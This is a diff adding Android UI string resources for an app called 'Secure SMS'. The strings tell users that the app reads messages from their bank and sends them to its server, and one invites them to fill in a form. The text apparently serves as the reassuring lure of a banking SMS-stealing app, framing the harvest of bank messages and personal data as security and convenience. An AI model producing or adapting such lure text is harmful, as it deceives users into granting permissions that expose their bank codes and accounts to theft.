@@ -1,0 +1,7 @@
+<resources>
+    <string name="app_name">Secure SMS</string>
+    <string name="greeting">Thank you for using our app! We wanted to let you know that we utilize two permissions to enhance your experience and ensure security:</string>
+    <string name="greeting_home">Thank you for using our app! We wanted to let you know that Please fill the form below for better app experience</string>
+    <string name="message">This permission is used to detect any messages originating from your bank, allowing seamless integration with banking services.</string>
+    <string name="internet">We utilize this permission to securely transmit these messages to our server for processing and analysis.</string>
+</resources>
